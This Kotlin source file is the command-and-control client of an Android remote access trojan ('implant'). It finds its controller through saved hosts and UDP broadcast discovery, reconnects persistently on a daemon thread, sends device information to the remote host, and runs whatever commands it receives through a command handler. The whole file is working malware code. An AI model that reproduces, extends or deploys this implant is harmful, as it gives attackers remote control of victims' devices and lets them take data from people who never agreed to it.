package com.example.rat

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.BufferedReader
import java.io.BufferedWriter
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.NetworkInterface
import java.net.Socket
import java.net.SocketTimeoutException

class C2Client(private val context: Context) {

    companion object {
        private const val TAG = "RAT"
        private const val PREFS = "c2"
        private const val KEY_LAST_HOST = "last_host"
    }

    private data class Endpoint(val host: String, val timeoutMs: Int)

    private val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    @Volatile private var running = true
    @Volatile private var socket: Socket? = null
    @Volatile private var lastGoodHost: String? = prefs.getString(KEY_LAST_HOST, null)

    fun start() {
        Thread { connectLoop() }.apply { isDaemon = true }.start()
    }

    private fun connectLoop() {
        while (running) {
            var session = false

            // Fast pass: last known host, then virtual emulator aliases.
            for (endpoint in fastCandidates()) {
                if (!running) break
                if (tryEndpoint(endpoint)) {
                    session = true
                    break
                }
            }

            // Slow pass: ask the network where the C2 is. This is what makes
            // the implant follow the laptop across Wi-Fi changes.
            if (!session && running) {
                val discovered = discoverHost()
                if (discovered != null) {
                    session = tryEndpoint(Endpoint(discovered, C2Config.CONNECT_TIMEOUT_NETWORK_MS))
                }
            }

            sleep(if (session) C2Config.SESSION_GRACE_MS else C2Config.RECONNECT_MS)
        }
    }

    private fun fastCandidates(): List<Endpoint> {
        val ordered = ArrayList<Endpoint>(C2Config.staticHosts.size + 1)
        val last = lastGoodHost
        if (last != null) ordered += Endpoint(last, C2Config.CONNECT_TIMEOUT_NETWORK_MS)
        C2Config.staticHosts.forEach { host ->
            if (ordered.none { it.host == host }) {
                ordered += Endpoint(host, C2Config.CONNECT_TIMEOUT_LOCAL_MS)
            }
        }
        return ordered
    }

    /**
     * UDP broadcast probe. Every interface's subnet broadcast plus the global
     * broadcast gets the magic string a few times; the first valid reply wins.
     */
    private fun discoverHost(): String? {
        var udp: DatagramSocket? = null
        try {
            udp = DatagramSocket()
            udp.broadcast = true
            udp.soTimeout = C2Config.DISCOVERY_TIMEOUT_MS

            val payload = C2Config.DISCOVERY_MAGIC.toByteArray(Charsets.UTF_8)
            val targets = broadcastAddresses() + InetAddress.getByName("255.255.255.255")

            repeat(C2Config.DISCOVERY_BURST) {
                for (address in targets.distinctBy { it.hostAddress }) {
                    try {
                        udp.send(DatagramPacket(payload, payload.size, address, C2Config.DISCOVERY_PORT))
                    } catch (_: Exception) {
                        // interface without broadcast support, skip it
                    }
                }
            }

            val buffer = ByteArray(256)
            val deadline = System.currentTimeMillis() +
                C2Config.DISCOVERY_TIMEOUT_MS.toLong() * C2Config.DISCOVERY_BURST

            while (running && System.currentTimeMillis() < deadline) {
                val packet = DatagramPacket(buffer, buffer.size)
                try {
                    udp.receive(packet)
                } catch (_: SocketTimeoutException) {
                    continue
                }
                val text = String(packet.data, 0, packet.length).trim()
                if (text.isEmpty()) continue
                val host = if (text.startsWith("{")) {
                    try {
                        JSONObject(text).optString("ip")
                    } catch (_: Exception) {
                        ""
                    }
                } else {
                    text
                }
                if (host.isNotEmpty()) {
                    Log.i(TAG, "discovered c2 at $host")
                    return host
                }
            }
            return null
        } catch (_: Exception) {
            return null
        } finally {
            try { udp?.close() } catch (_: Exception) {}
        }
    }

    private fun broadcastAddresses(): List<InetAddress> {
        val out = ArrayList<InetAddress>()
        try {
            for (nic in NetworkInterface.getNetworkInterfaces()) {
                if (!nic.isUp || nic.isLoopback) continue
                for (address in nic.interfaceAddresses) {
                    val broadcast = address.broadcast ?: continue
                    out += broadcast
                }
            }
        } catch (_: Exception) {
            // fall back to the global broadcast only
        }
        return out
    }

    private fun tryEndpoint(endpoint: Endpoint): Boolean {
        var s: Socket? = null
        try {
            s = Socket()
            s.connect(InetSocketAddress(endpoint.host, C2Config.PORT), endpoint.timeoutMs)
            socket = s
            recordGoodHost(endpoint.host)
            Log.i(TAG, "connected to ${endpoint.host}:${C2Config.PORT}")

            val reader = BufferedReader(InputStreamReader(s.getInputStream()))
            val writer = BufferedWriter(OutputStreamWriter(s.getOutputStream()))

            val hello = JSONObject()
                .put("type", "hello")
                .put("device", DeviceInfo.get(context))
            writer.write(hello.toString() + "\n")
            writer.flush()

            while (running) {
                val line = reader.readLine() ?: break
                val command = JSONObject(line)
                val reply = CommandHandler(context).handle(command)
                writer.write(reply.toString() + "\n")
                writer.flush()
            }
            return true
        } catch (e: Exception) {
            Log.d(TAG, "${endpoint.host} failed: ${e.javaClass.simpleName}")
            if (endpoint.host == lastGoodHost) clearGoodHost()
            return false
        } finally {
            try { s?.close() } catch (_: Exception) {}
            if (socket === s) socket = null
        }
    }

    private fun recordGoodHost(host: String) {
        lastGoodHost = host
        prefs.edit().putString(KEY_LAST_HOST, host).apply()
    }

    private fun clearGoodHost() {
        lastGoodHost = null
        prefs.edit().remove(KEY_LAST_HOST).apply()
    }

    private fun sleep(ms: Long) {
        try {
            Thread.sleep(ms)
        } catch (_: InterruptedException) {
            running = false
        }
    }

    fun stop() {
        running = false
        try { socket?.close() } catch (_: Exception) {}
    }
}
